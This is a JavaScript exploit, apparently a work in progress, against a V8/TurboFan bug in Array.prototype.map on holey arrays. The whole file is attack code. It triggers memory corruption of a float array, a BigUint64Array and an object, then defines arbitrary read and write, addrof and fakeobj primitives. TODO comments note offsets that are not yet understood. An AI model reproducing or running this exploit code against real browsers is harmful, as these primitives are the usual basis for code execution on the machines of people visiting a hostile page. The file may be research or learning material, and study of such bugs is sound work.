// Generate a large array to ensure TurboFan won't inline array constructors
Array(2**30);

// Create a fast, holey smi array
// Fast, holey array refer to the use of arrays internally
// (rather than dictionaries internally for sparse, holey arrays)
// Ref: https://v8.dev/blog/fast-properties
var holey_smi_array = [1, 2, ,,, 3];
var float_array;
var typed_array;
var object;

// Offset of float array length field from the Array.map output
const float_array_length_offset = 23;
// Offset of typed array length field from the Array.map output
const typed_array_length_offset = 24;
// Offset of typed array address pointer from the Array.map output
const typed_array_address_offset = 25;
// Offset of object['b'] from the Array.map output
const object_property_b_offset = 33;

function mapping(array) {
    function callback(_element, index) {
        if (index == 0) {
            float_array = [0.1, 0.2];

            typed_array = new BigUint64Array(2);
            // The n suffix indicates bigint literal 
            typed_array[0] = 0x41414141n;
            typed_array[1] = 0x42424242n;

            object = {'a': 0x31323334, 'b': 1};
            object['b'] = object;
        }

        // Minimize the corruption for stability
        if (index > float_array_length_offset)
            throw 'stop';
        
        return index;
    }

    return array.map(callback);
}

for (let i=0; i<10**5; i++)
    mapping(holey_smi_array);

// Lengthen the array but ensure it points to a array (non-dictionary) store
holey_smi_array.length = (32 * 1024 * 1024) - 1;
holey_smi_array.fill(1, float_array_length_offset, float_array_length_offset + 1);
holey_smi_array.fill(1, float_array_length_offset + 2);
holey_smi_array.push(2);
holey_smi_array.length += 500;

// The elements of holey_smi_array are now:
// (can verify with %DebugPrint with debug d8)
//
//                   0: 1
//                   1: 2
//                 2-4: <hole>
//                   5: 3
//                6-22: <hole>
//                  23: 1
//                  24: <hole>
//         25-33554430: 1
//            33554431: 2
//   33554432-33554931: <hole>

// Exception caused by the throw within the mapping callback
try { mapping(holey_smi_array); } catch (e) { }

// TODO Show the corruption of float_array, typed_array and object.
//      Need to first review writeups/docs defining object/array memory layout.
//      Use gdb and/or addrof/read (defined below) to determine specifics.

// Conversion functions

var view = new DataView(new ArrayBuffer(8));

Number.prototype.f2i = function() {
    view.setFloat64(0, this);
    return view.getBigUint64(0);
};

Number.prototype.i2f = function() {
    view.setBigUint64(0, BigInt(this));
    return view.getFloat64();
};

BigInt.prototype.i2f = function() {
    view.setBigUint64(0, this);
    return view.getFloat64();
};

var output = function(...args) {
    let s = '';
    for (const arg of args)
        s += arg + ' ';
    document.write(s + '<br/>');
};

if (
  float_array.length == 2 ||
  float_array[typed_array_length_offset + 3].f2i() != 0x41414141 ||
  float_array[typed_array_length_offset + 4].f2i() != 0x42424242 ||
  float_array[typed_array_length_offset + 8].f2i() != 0x3132333400000000n
) {
    output('float_array corruption failed');
}

// TODO Both read and write require offsetting the address by -0x1f
//      Investigate and document why this is necessary.
//      The fakeobj primitive does not seem to require this.

function read(addr) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    let retval = typed_array[0];
    float_array[typed_array_address_offset] = orig_addr;
    return retval;
}

function write(addr, val) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    typed_array[0] = val;
    float_array[typed_array_address_offset] = orig_addr;
}

function addrof(obj) {
    object['b'] = obj;
    return float_array[object_property_b_offset].f2i();
}

function fakeobj(addr) {
    float_array[object_property_b_offset] = addr.i2f();
    return object['b'];
}
